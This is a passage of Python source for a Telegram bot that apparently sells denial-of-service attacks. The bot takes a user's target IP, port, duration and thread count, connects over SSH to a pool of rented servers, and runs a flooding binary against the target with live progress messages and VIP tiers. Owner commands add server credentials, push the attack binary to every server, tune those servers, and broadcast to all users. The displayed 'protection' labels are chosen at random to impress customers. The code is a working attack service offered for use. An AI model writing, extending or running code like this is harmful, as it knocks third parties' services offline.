def execute_attack(vps, ip, port, duration, threads):
    """Execute attack command on a VPS with proper timeout"""
    ssh = None
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps[0], username=vps[1], password=vps[2], timeout=15)
        
        # Use timeout command to ensure attack stops after duration
        cmd = f"timeout {duration} {BINARY_PATH} {ip} {port} {duration} {threads}"
        stdin, stdout, stderr = ssh.exec_command(cmd, timeout=10)
        exit_status = stdout.channel.recv_exit_status()
        
        # Timeout exits with status 124 - that's expected
        if exit_status not in [0, 124]:
            raise Exception(f"Attack failed with exit code {exit_status}")
        return True
    except Exception as e:
        raise Exception(f"Attack execution failed: {str(e)}")
    finally:
        if ssh:
            ssh.close()

def run_ssh_attack(vps, ip, port, duration, threads, attack_id, attack_num, chat_id, user_id, is_vip, msg_id, country, flag, protection, is_public=False):
    attack_id_vps = f"{attack_id}-{attack_num}"
    running_attacks[attack_id_vps] = {
        'user_id': user_id,
        'target_ip': ip,
        'start_time': time.time(),
        'duration': duration,
        'is_vip': is_vip,
        'vps_ip': vps[0],
        'is_public': is_public,
        'threads': threads,
        'completed': False,
        'message_sent': False  # Track if completion message was sent
    }
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps[0], username=vps[1], password=vps[2], timeout=15)
        
        cmd = f"timeout {duration} {BINARY_PATH} {ip} {port} {duration} {threads} &"
        ssh.exec_command(cmd)
        
        start_time = time.time()
        last_update = 0
        
        while True:
            current_time = time.time()
            elapsed = current_time - start_time
            progress = min(100, int((elapsed / duration) * 100))
            
            if current_time - last_update >= 1:
                update_attack_status(chat_id, msg_id, ip, port, duration, threads, progress, country, flag, protection, is_vip, is_public)
                last_update = current_time
            
            if elapsed >= duration:
                break
                
            time.sleep(0.1)
        
        update_attack_status(chat_id, msg_id, ip, port, duration, threads, 100, country, flag, protection, is_vip, is_public)
        
        # Mark this attack as completed
        running_attacks[attack_id_vps]['completed'] = True
        
        # Check if we should send completion message
        target_attacks = [aid for aid in running_attacks if aid.startswith(attack_id)]
        all_completed = all(running_attacks[aid]['completed'] for aid in target_attacks)
        
        if all_completed and not running_attacks[attack_id_vps]['message_sent']:
            # Mark all as having message sent to prevent duplicates
            for aid in target_attacks:
                running_attacks[aid]['message_sent'] = True
            
            attack_type = "🌐 PUBLIC" if is_public else "🔥 VIP" if is_vip else "⚡ SPECIAL"
            completion_msg = f"""
╭━━━〔 {attack_type} ATTACK COMPLETED 〕━━━╮
│
│ 🎯 Target: {ip}:{port}
│ ⏱ Duration: {duration}s
│ 🧵 Threads: {threads}
│
│ {flag} {country}
│ 🛡️ Protection: {protection}
│
│ ✅ All attacks finished successfully!
│
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
"""
            bot.send_message(chat_id, completion_msg)
            
    except Exception as e:
        error_msg = f"❌ ATTACK ERROR ({vps[0]})\n\n{flag} {country} | 🛡️ {protection}\nError: {str(e)}\n\n🎯 Target: {ip}:{port}\n⚠️ Attack interrupted"
        bot.send_message(chat_id, error_msg)
    finally:
        try:
            ssh.close()
        except:
            pass
        
        # Clean up if all attacks are done
        target_attacks = [aid for aid in running_attacks if aid.startswith(attack_id)]
        if all(running_attacks[aid].get('message_sent', False) for aid in target_attacks):
            for aid in target_attacks:
                running_attacks.pop(aid, None)

def update_attack_status(chat_id, msg_id, ip, port, duration, threads, progress, country, flag, protection, is_vip, is_public):
    attack_type = "🌐 PUBLIC" if is_public else "🔥 VIP" if is_vip else "⚡ SPECIAL"
    progress_bar = create_progress_bar(progress)
    elapsed_time = int(duration * (progress/100))
    remaining_time = max(0, duration - elapsed_time)
    
    status_msg = f"""
╭━━━〔 {attack_type} ATTACK 〕━━━╮
│
│ 🎯 Target: {ip}:{port}
│ ⏱ Duration: {duration}s (Elapsed: {elapsed_time}s)
│ 🧵 Threads: {threads}
│
│ {flag} {country}
│ 🛡️ Protection: {protection}
│
│ {progress_bar}
│ {'⚡ Running' if progress < 100 else '✅ Completing...'}
│
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
"""
    try:
        bot.edit_message_text(status_msg, chat_id, msg_id)
    except:
        pass

def start_attack(message, ip, port, duration, threads, is_public=False):
    user_id = str(message.from_user.id)
    is_vip = user_id in redeemed_users and isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_vip')
    
    vps_distribution = select_optimal_vps(VPS_LIST, threads)
    if not vps_distribution:
        bot.reply_to(message, "❌ No servers available! Try again later.")
        return
    
    attack_id = f"{ip}:{port}-{time.time()}"
    country, flag = random.choice([
        ("United States", "🇺🇸"), ("Germany", "🇩🇪"), ("Japan", "🇯🇵"),
        ("Singapore", "🇸🇬"), ("Netherlands", "🇳🇱"), ("France", "🇫🇷")
    ])
    
    protection = random.choice([
        "Cloudflare Enterprise", "AWS Shield", "Google Armor",
        "Imperva Defense", "Akamai Prolexic", "Azure Protection"
    ])
    
    attack_type = "🌐 PUBLIC" if is_public else "🔥 VIP" if is_vip else "⚡ SPECIAL"
    msg_text = f"""
╭━━━〔 {attack_type} ATTACK 〕━━━╮
│
│ 🎯 Target: {ip}:{port}
│ ⏱ Duration: {duration}s
│ 🧵 Threads: {threads}
│
│ {flag} {country}
│ 🛡️ Protection: {protection}
│
│ {create_progress_bar(0)}
│ 🔄 Initializing attack...
│
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
"""
    msg = bot.send_message(message.chat.id, msg_text)
    
    for i, (vps, vps_threads) in enumerate(vps_distribution):
        if vps_threads > 0:
            threading.Thread(
                target=run_ssh_attack,
                args=(vps, ip, port, duration, vps_threads, attack_id, i, 
                      message.chat.id, user_id, is_vip, msg.message_id, 
                      country, flag, protection, is_public),
                daemon=True
            ).start()
    
    global last_attack_time
    last_attack_time = time.time()

# ======================
# 🖥️ VPS MANAGEMENT (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "➕ 𝘼𝘿𝘿 𝙑𝙋𝙎")
def add_vps_start(message):
    """Start VPS addition process with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "❌ 𝗢𝗻𝗹𝘆 𝗼𝘄𝗻𝗲𝗿 𝗰𝗮𝗻 𝗮𝗱𝗱 𝗩𝗣𝗦!")
        return
    
    bot.reply_to(message,
        "⚠️ 𝗘𝗻𝘁𝗲𝗿 𝗩𝗣𝗦 𝗱𝗲𝘁𝗮𝗶𝗹𝘀 𝗶𝗻 𝗳𝗼𝗿𝗺𝗮𝘁:\n\n"
        "<𝗶𝗽> <𝘂𝘀𝗲𝗿𝗻𝗮𝗺𝗲> <𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱>\n\n"
        "𝗘𝘅𝗮𝗺𝗽𝗹𝗲: 𝟭.𝟭.𝟭.𝟭 𝗿𝗼𝗼𝘁 𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱𝟭𝟮𝟯")
    bot.register_next_step_handler(message, add_vps_process)

def add_vps_process(message):
    """Process VPS addition with premium styling"""
    try:
        ip, username, password = message.text.split()

        # Try SSH connection before saving
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password, timeout=10)
        ssh.close()

        VPS_LIST.append([ip, username, password])
        save_data()

        bot.reply_to(message,
            f"✅ 𝗩𝗣𝗦 𝗮𝗱𝗱𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!\n"
            f"𝗜𝗣: `{ip}`\n"
            f"𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: `{username}`",
            parse_mode="Markdown")

    except Exception as e:
        bot.reply_to(message, f"❌ 𝗘𝗿𝗿𝗼𝗿: {str(e)}\n𝗩𝗣𝗦 𝗻𝗼𝘁 𝗮𝗱𝗱𝗲𝗱. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗰𝗵𝗲𝗰𝗸 𝗜𝗣/𝗨𝗦𝗘𝗥/𝗣𝗔𝗦𝗦.")

@bot.message_handler(func=lambda msg: msg.text == "➖ 𝙍𝙀𝙈𝙊𝙑𝙀 𝙑𝙋𝙎")
def remove_vps_start(message):
    """Start VPS removal process with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "❌ 𝗢𝗻𝗹𝘆 𝗼𝘄𝗻𝗲𝗿 𝗰𝗮𝗻 𝗿𝗲𝗺𝗼𝘃𝗲 𝗩𝗣𝗦!")
        return
    
    if not VPS_LIST:
        bot.reply_to(message, "❌ 𝗡𝗼 𝗩𝗣𝗦 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝘁𝗼 𝗿𝗲𝗺𝗼𝘃𝗲!")
        return
    
    vps_list_text = "\n".join(f"{i+1}. 𝗜𝗣: {vps[0]}, 𝗨𝘀𝗲𝗿: {vps[1]}" for i, vps in enumerate(VPS_LIST))
    
    bot.reply_to(message,
        f"⚠️ 𝗦𝗲𝗹𝗲𝗰𝘁 𝗩𝗣𝗦 𝘁𝗼 𝗿𝗲𝗺𝗼𝘃𝗲 𝗯𝘆 𝗻𝘂𝗺𝗯𝗲𝗿:\n\n{vps_list_text}")
    bot.register_next_step_handler(message, remove_vps_process)

def remove_vps_process(message):
    """Process VPS removal with premium styling"""
    try:
        selection = int(message.text) - 1
        if 0 <= selection < len(VPS_LIST):
            removed_vps = VPS_LIST.pop(selection)
            save_data()
            bot.reply_to(message,
                f"✅ 𝗩𝗣𝗦 𝗿𝗲𝗺𝗼𝘃𝗲𝗱!\n"
                f"𝗜𝗣: {removed_vps[0]}\n"
                f"𝗨𝘀𝗲𝗿: {removed_vps[1]}")
        else:
            bot.reply_to(message, "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝘀𝗲𝗹𝗲𝗰𝘁𝗶𝗼𝗻!")
    except:
        bot.reply_to(message, "❌ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿!")

@bot.message_handler(func=lambda msg: msg.text == "📤 𝙐𝙋𝙇𝙊𝘼𝘿 𝘽𝙄𝙉𝘼𝙍𝙔")
def upload_binary_start(message):
    """Initiate binary upload process with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "⛔ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗!\n𝗢𝗡𝗟𝗬 𝗢𝗪𝗡𝗘𝗥𝗦 𝗖𝗔𝗡 𝗨𝗣𝗟𝗢𝗔𝗗 𝗕𝗜𝗡𝗔𝗥𝗜𝗘𝗦.")
        return

    if not VPS_LIST:
        bot.reply_to(message, "❌ 𝗡𝗢 𝗩𝗣𝗦 𝗖𝗢𝗡𝗙𝗜𝗚𝗨𝗥𝗘𝗗!")
        return

    bot.reply_to(message,
        "⬆️ 𝗨𝗣𝗟𝗢𝗔𝗗 𝗕𝗜𝗡𝗔𝗥𝗬 𝗜𝗡𝗦𝗧𝗥𝗨𝗖𝗧𝗜𝗢𝗡𝗦\n\n"
        "𝟭. 𝗨𝗽𝗹𝗼𝗮𝗱 𝘆𝗼𝘂𝗿 𝗯𝗶𝗻𝗮𝗿𝘆 𝗳𝗶𝗹𝗲\n"
        "𝟮. 𝗠𝘂𝘀𝘁 𝗯𝗲 𝗻𝗮𝗺𝗲𝗱: `pushpa`\n"
        "𝟯. 𝗪𝗶𝗹𝗹 𝗯𝗲 𝗶𝗻𝘀𝘁𝗮𝗹𝗹𝗲𝗱 𝘁𝗼: `/home/master/freeroot/root/`\n\n"
        "⚠️ 𝗪𝗔𝗥𝗡𝗜𝗡𝗚: 𝗧𝗛𝗜𝗦 𝗪𝗜𝗟𝗟 𝗢𝗩𝗘𝗥𝗪𝗥𝗜𝗧𝗘 𝗘𝗫𝗜𝗦𝗧𝗜𝗡𝗚 𝗕𝗜𝗡𝗔𝗥𝗜𝗘𝗦!",
        parse_mode="Markdown")
    
    bot.register_next_step_handler(message, handle_binary_upload)

def handle_binary_upload(message):
    """Process uploaded binary file with premium styling"""
    if not message.document:
        bot.reply_to(message, "❌ 𝗡𝗢 𝗙𝗜𝗟𝗘 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗! 𝗣𝗟𝗘𝗔𝗦𝗘 𝗨𝗣𝗟𝗢𝗔𝗗 𝗔 𝗕𝗜𝗡𝗔𝗥𝗬 𝗙𝗜𝗟𝗘.")
        return

    file_name = message.document.file_name
    if file_name != BINARY_NAME:
        bot.reply_to(message, f"❌ 𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗙𝗜𝗟𝗘 𝗡𝗔𝗠𝗘! 𝗠𝗨𝗦𝗧 𝗕𝗘: `{BINARY_NAME}`")
        return

    # Download file temporarily
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    temp_path = f"/tmp/{file_name}"
    
    with open(temp_path, 'wb') as new_file:
        new_file.write(downloaded_file)

    # Start distribution
    msg = bot.reply_to(message, "🔄 𝗗𝗜𝗦𝗧𝗥𝗜𝗕𝗨𝗧𝗜𝗡𝗚 𝗕𝗜𝗡𝗔𝗥𝗬 𝗧𝗢 𝗔𝗟𝗟 𝗩𝗣𝗦...")
    
    success_count = 0
    results = []
    
    for vps in VPS_LIST[:ACTIVE_VPS_COUNT]:  # Only active VPS
        ip, username, password = vps
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=15)
            
            with SCPClient(ssh.get_transport()) as scp:
                scp.put(temp_path, f"/home/master/freeroot/root/{BINARY_NAME}")
            
            # Make executable
            ssh.exec_command(f"chmod +x /home/master/freeroot/root/{BINARY_NAME}")
            
            # Verify
            stdin, stdout, stderr = ssh.exec_command(f"ls -la /home/master/freeroot/root/{BINARY_NAME}")
            if BINARY_NAME in stdout.read().decode():
                results.append(f"✅ {ip} - 𝗦𝘂𝗰𝗰𝗲𝘀𝘀")
                success_count += 1
            else:
                results.append(f"⚠️ {ip} - 𝗨𝗽𝗹𝗼𝗮𝗱 𝗳𝗮𝗶𝗹𝗲𝗱")
            
            ssh.close()
        except Exception as e:
            results.append(f"❌ {ip} - 𝗘𝗿𝗿𝗼𝗿: {str(e)}")

    # Cleanup and report
    os.remove(temp_path)
    
    bot.edit_message_text(
        f"📊 𝗕𝗜𝗡𝗔𝗥𝗬 𝗗𝗜𝗦𝗧𝗥𝗜𝗕𝗨𝗧𝗜𝗢𝗡 𝗥𝗘𝗦𝗨𝗟𝗧𝗦:\n\n"
        f"• 𝗦𝘂𝗰𝗰𝗲𝘀𝘀: {success_count}/{len(VPS_LIST[:ACTIVE_VPS_COUNT])}\n"
        f"• 𝗙𝗮𝗶𝗹𝗲𝗱: {len(VPS_LIST[:ACTIVE_VPS_COUNT]) - success_count}\n\n"
        f"𝗗𝗘𝗧𝗔𝗜𝗟𝗦:\n" + "\n".join(results),
        message.chat.id,
        msg.message_id,
        parse_mode="Markdown"
    )        

@bot.message_handler(func=lambda msg: msg.text == "🗑️ 𝘿𝙀𝙇𝙀𝙏𝙀 𝘽𝙄𝙉𝘼𝙍𝙔")
def delete_binary_all_vps(message):
    """Delete binary from all VPS servers with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "⛔ 𝗢𝗡𝗟𝗬 𝗢𝗪𝗡𝗘𝗥𝗦 𝗖𝗔𝗡 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗!")
        return

    if not VPS_LIST:
        bot.reply_to(message, "❌ 𝗡𝗢 𝗩𝗣𝗦 𝗖𝗢𝗡𝗙𝗜𝗚𝗨𝗥𝗘𝗗!")
        return

    msg = bot.reply_to(message, "⏳ 𝗗𝗲𝗹𝗲𝘁𝗶𝗻𝗴 𝗕𝗶𝗻𝗮𝗿𝘆 𝗳𝗿𝗼𝗺 𝗔𝗟𝗟 𝗩𝗣𝗦...")

    success, failed, result_lines = 0, 0, []

    for vps in VPS_LIST:
        try:
            ip, username, password = vps
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=10)

            ssh.exec_command(f"rm -f /home/master/freeroot/root/{BINARY_NAME}")
            ssh.close()
            success += 1
            result_lines.append(f"✅ `{ip}` - 𝗕𝗶𝗻𝗮𝗿𝘆 𝗱𝗲𝗹𝗲𝘁𝗲𝗱")
        except Exception as e:
            failed += 1
            result_lines.append(f"❌ `{ip}` - 𝗘𝗿𝗿𝗼𝗿: `{str(e)}`")

    final_msg = (
        f"🗑️ *𝗕𝗜𝗡𝗔𝗥𝗬 𝗗𝗘𝗟𝗘𝗧𝗜𝗢𝗡 𝗥𝗘𝗣𝗢𝗥𝗧*\n\n"
        f"✅ *𝗦𝘂𝗰𝗰𝗲𝘀𝘀:* {success}\n"
        f"❌ *𝗙𝗮𝗶𝗹𝗲𝗱:* {failed}\n\n"
        f"*𝗗𝗘𝗧𝗔𝗜𝗟𝗦:*\n" + "\n".join(result_lines)
    )

    bot.edit_message_text(final_msg, message.chat.id, msg.message_id, parse_mode="Markdown")

@bot.message_handler(func=lambda msg: msg.text == "⚡ 𝘽𝙊𝙊𝙎𝙏 𝙑𝙋𝙎 (𝙎𝘼𝙁𝙀)")
def safe_boost_vps(message):
    """Boost VPS performance without deleting any files with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "⛔ 𝗢𝗻𝗹𝘆 𝗼𝘄𝗻𝗲𝗿 𝗰𝗮𝗻 𝗯𝗼𝗼𝘀𝘁 𝗩𝗣𝗦!", reply_markup=create_main_keyboard(message))
        return

    # Send initial message with loading animation
    msg = bot.send_message(message.chat.id, "⚡ 𝗕𝗼𝗼𝘀𝘁𝗶𝗻𝗴 𝗩𝗣𝗦 (𝗦𝗮𝗳𝗲 𝗠𝗼𝗱𝗲)...")
    
    success = 0
    failed = 0
    optimization_details = []

    for vps in VPS_LIST:
        try:
            ip, username, password = vps
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=15)
            
            # SAFE OPTIMIZATION COMMANDS (NO FILE DELETION)
            commands = [
                # Clear RAM cache (safe)
                "sync; echo 3 > /proc/sys/vm/drop_caches",
                
                # Optimize SWAP
                "swapoff -a && swapon -a",
                
                # Clear DNS cache
                "systemctl restart systemd-resolved 2>/dev/null || service nscd restart 2>/dev/null",
                
                # Kill zombie processes
                "kill -9 $(ps -A -ostat,ppid | awk '/[zZ]/ && !a[$2]++ {print $2}') 2>/dev/null || true",
                
                # Network optimization
                "sysctl -w net.ipv4.tcp_fin_timeout=30",
                "sysctl -w net.ipv4.tcp_tw_reuse=1"
            ]
            
            # Execute all optimization commands
            for cmd in commands:
                ssh.exec_command(cmd)
            
            # Get before/after memory stats
            stdin, stdout, stderr = ssh.exec_command("free -m | awk 'NR==2{printf \"%.2f%%\", $3*100/$2}'")
            mem_usage = stdout.read().decode().strip()
            
            optimization_details.append(f"✅ {ip} - Memory: {mem_usage}")
            success += 1
            ssh.close()
            
        except Exception as e:
            failed += 1
            optimization_details.append(f"❌ {ip} - Error: {str(e)[:50]}...")
            continue

    # Prepare final report
    report = f"""
╭━━━〔 ⚡ 𝗩𝗣𝗦 𝗕𝗢𝗢𝗦𝗧 𝗥𝗘𝗣𝗢𝗥𝗧 (𝗦𝗔𝗙𝗘) 〕━━━╮
│
├ 📊 𝗦𝘁𝗮𝘁𝘀: {success}✅ | {failed}❌
│
├ 𝗢𝗽𝘁𝗶𝗺𝗶𝘇𝗮𝘁𝗶𝗼𝗻𝘀 𝗔𝗽𝗽𝗹𝗶𝗲𝗱:
├ • RAM Cache Cleared
├ • SWAP Memory Optimized  
├ • DNS Cache Flushed
├ • Zombie Processes Killed
├ • Network Stack Tuned
│
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯

📝 𝗗𝗲𝘁𝗮𝗶𝗹𝗲𝗱 𝗥𝗲𝘀𝘂𝗹𝘁𝘀:
""" + "\n".join(optimization_details)

    # Edit the original message with final report
    try:
        if len(report) > 4000:
            # Split long messages
            part1 = report[:4000]
            part2 = report[4000:]
            bot.edit_message_text(part1, message.chat.id, msg.message_id)
            bot.send_message(message.chat.id, part2)
        else:
            bot.edit_message_text(report, message.chat.id, msg.message_id)
    except:
        bot.send_message(message.chat.id, report)

# ======================
# 📢 BROADCAST SYSTEM (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "📢 𝘽𝙍𝙊𝘿𝘾𝘼𝙎𝙏")
def send_notice_handler(message):
    """Handle broadcast message initiation with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "🚫 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗", reply_markup=create_main_keyboard(message))
        return

    msg = bot.send_message(message.chat.id, 
        "📢 𝗦𝗘𝗡𝗗 𝗬𝗢𝗨𝗥 𝗡𝗢𝗧𝗜𝗖𝗘 (𝗔𝗡𝗬 𝗢𝗙 𝗧𝗛𝗘𝗦𝗘):\n"
        "• 𝗧𝗲𝘅𝘁 𝗺𝗲𝘀𝘀𝗮𝗴𝗲\n"
        "• 𝗣𝗵𝗼𝘁𝗼 𝘄𝗶𝘁𝗵 𝗰𝗮𝗽𝘁𝗶𝗼𝗻\n" 
        "• 𝗩𝗶𝗱𝗲𝗼 𝘄𝗶𝘁𝗵 𝗰𝗮𝗽𝘁𝗶𝗼𝗻\n"
        "• 𝗙𝗶𝗹𝗲/𝗱𝗼𝗰𝘂𝗺𝗲𝗻𝘁 𝘄𝗶𝘁𝗵 𝗰𝗮𝗽𝘁𝗶𝗼𝗻")
    bot.register_next_step_handler(msg, capture_notice_message)

def capture_notice_message(message):
    """Capture the broadcast message content with premium styling"""
    if message.content_type not in ['text', 'photo', 'video', 'document']:
        bot.reply_to(message, "⚠️ 𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗘𝗡𝗗 𝗢𝗡𝗟𝗬:\n𝗧𝗲𝘅𝘁/𝗣𝗵𝗼𝘁𝗼/𝗩𝗶𝗱𝗲𝗼/𝗙𝗶𝗹𝗲")
        return

    notice = {
        "type": message.content_type,
        "content": message.text if message.content_type == 'text' else message.caption,
        "sender": message.from_user.id
    }

    # Handle different attachment types
    if message.content_type == 'photo':
        notice['file_id'] = message.photo[-1].file_id
    elif message.content_type == 'video':
        notice['file_id'] = message.video.file_id
    elif message.content_type == 'document':
        notice['file_id'] = message.document.file_id
        notice['file_name'] = message.document.file_name

    instructor_notices[str(message.from_user.id)] = notice

    markup = telebot.types.InlineKeyboardMarkup()
    markup.row(
        telebot.types.InlineKeyboardButton("✅ 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗡𝗢𝗪", callback_data="broadcast_now"),
        telebot.types.InlineKeyboardButton("❌ 𝗖𝗔𝗡𝗖𝗘𝗟", callback_data="cancel_notice")
    )

    # Create premium preview message
    preview_text = f"""
╭━━━〔 📢 𝗡𝗢𝗧𝗜𝗖𝗘 𝗣𝗥𝗘𝗩𝗜𝗘𝗪 〕━━━╮
┃
┣ 𝗧𝘆𝗽𝗲: {'𝗧𝗘𝗫𝗧' if notice['type'] == 'text' else '𝗣𝗛𝗢𝗧𝗢' if notice['type'] == 'photo' else '𝗩𝗜𝗗𝗘𝗢' if notice['type'] == 'video' else '𝗙𝗜𝗟𝗘'}
┃
"""
    
    if notice['content']:
        preview_text += f"┣ 𝗖𝗼𝗻𝘁𝗲𝗻𝘁: {notice['content']}\n"
    
    if notice['type'] == 'document':
        preview_text += f"┣ 𝗙𝗶𝗹𝗲: {notice['file_name']}\n"

    preview_text += "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n"
    preview_text += "\n⚠️ 𝗖𝗢𝗡𝗙𝗜𝗥𝗠 𝗧𝗢 𝗦𝗘𝗡𝗗 𝗧𝗛𝗜𝗦 𝗡𝗢𝗧𝗜𝗖𝗘?"

    bot.send_message(
        message.chat.id,
        preview_text,
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data in ['broadcast_now', 'cancel_notice'])
def handle_notice_confirmation(call):
    """Handle broadcast confirmation with premium styling"""
    user_id = str(call.from_user.id)
    notice = instructor_notices.get(user_id)
    
    if not notice:
        bot.edit_message_text("⚠️ 𝗡𝗢 𝗡𝗢𝗧𝗜𝗖𝗘 𝗙𝗢𝗨𝗡𝗗 𝗧𝗢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧", call.message.chat.id, call.message.message_id)
        return

    results = {'success': 0, 'failed': 0}

    def send_notice(chat_id):
        try:
            caption = f"»»—— 𝐀𝐋𝐎𝐍𝐄 ƁƠƳ ♥ OFFICIAL NOTICE \n\n{notice['content']}" if notice['content'] else "---------------------"
            
            if notice['type'] == 'text':
                bot.send_message(chat_id, caption)
            elif notice['type'] == 'photo':
                bot.send_photo(chat_id, notice['file_id'], caption=caption)
            elif notice['type'] == 'video':
                bot.send_video(chat_id, notice['file_id'], caption=caption)
            elif notice['type'] == 'document':
                bot.send_document(chat_id, notice['file_id'], caption=caption)
            results['success'] += 1
        except Exception as e:
            print(f"Error sending notice to {chat_id}: {e}")
            results['failed'] += 1

    bot.edit_message_text("📡 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧𝗜𝗡𝗚 𝗡𝗢𝗧𝗜𝗖𝗘...", call.message.chat.id, call.message.message_id)

    # Send to all users who ever interacted with the bot
    for uid in all_users:
        send_notice(uid)
        time.sleep(0.1)  # Rate limiting

    # Send to all allowed groups
    for gid in ALLOWED_GROUP_IDS:
        send_notice(gid)
        time.sleep(0.2)  # More delay for groups to avoid rate limits

    instructor_notices.pop(user_id, None)

    report = f"""
╭━━━〔 📊 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗥𝗘𝗣𝗢𝗥𝗧 〕━━━╮
┃
┣ ✅ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀: {results['success']}
┣ ❌ 𝗙𝗮𝗶𝗹𝗲𝗱: {results['failed']}
┃
┣ ⏱ {datetime.datetime.now().strftime('%d %b %Y %H:%M:%S')}
┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
"""
    bot.send_message(call.message.chat.id, report, reply_markup=create_main_keyboard(call.message))

# ======================
# 👥 GROUP MANAGEMENT (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "👥 𝘼𝘿𝘿 𝙂𝙍𝙊𝙐𝙋")
def add_group_handler(message):
    """Add a new allowed group with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "🚫 𝗢𝗻𝗹𝘆 𝗼𝘄𝗻𝗲𝗿𝘀 𝗰𝗮𝗻 𝗮𝗱𝗱 𝗴𝗿𝗼𝘂𝗽𝘀!")
        return
    
    bot.reply_to(message, "⚙️ 𝗦𝗲𝗻𝗱 𝘁𝗵𝗲 𝗚𝗥𝗢𝗨𝗣 𝗜𝗗 𝘆𝗼𝘂 𝘄𝗮𝗻𝘁 𝘁𝗼 𝗮𝗱𝗱.\nExample: `-1001234567890`", parse_mode="Markdown")
    bot.register_next_step_handler(message, process_add_group)

def process_add_group(message):
    """Process group addition with premium styling"""
    try:
        group_id = int(message.text.strip())
        if group_id in ALLOWED_GROUP_IDS:
            bot.reply_to(message, "⚠️ 𝗧𝗵𝗶𝘀 𝗴𝗿𝗼𝘂𝗽 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗶𝗻 𝘁𝗵𝗲 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝗹𝗶𝘀𝘁.")
            return
        ALLOWED_GROUP_IDS.append(group_id)
        bot.reply_to(message, f"✅ 𝗚𝗿𝗼𝘂𝗽 𝗜𝗗 `{group_id}` 𝗮𝗱𝗱𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ 𝗘𝗿𝗿𝗼𝗿: {str(e)}")    

@bot.message_handler(func=lambda msg: msg.text == "👥 𝙍𝙀𝙈𝙊𝙑𝙀 𝙂𝙍𝙊𝙐𝙋")
def remove_group_handler(message):
    """Remove an allowed group with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "🚫 𝗢𝗻𝗹𝘆 𝗼𝘄𝗻𝗲𝗿𝘀 𝗰𝗮𝗻 𝗿𝗲𝗺𝗼𝘃𝗲 𝗴𝗿𝗼𝘂𝗽𝘀!")
        return
    
    if not ALLOWED_GROUP_IDS:
        bot.reply_to(message, "⚠️ 𝗡𝗼 𝗴𝗿𝗼𝘂𝗽𝘀 𝗶𝗻 𝘁𝗵𝗲 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝗹𝗶𝘀𝘁!")
        return
    
    groups_list = "\n".join(f"{i+1}. `{gid}`" for i, gid in enumerate(ALLOWED_GROUP_IDS))
    bot.reply_to(message, f"⚙️ 𝗖𝗵𝗼𝗼𝘀𝗲 𝗴𝗿𝗼𝘂𝗽 𝗻𝘂𝗺𝗯𝗲𝗿 𝘁𝗼 𝗿𝗲𝗺𝗼𝘃𝗲:\n\n{groups_list}", parse_mode="Markdown")
    bot.register_next_step_handler(message, process_remove_group)

def process_remove_group(message):
    """Process group removal with premium styling"""
    try:
        idx = int(message.text.strip()) - 1
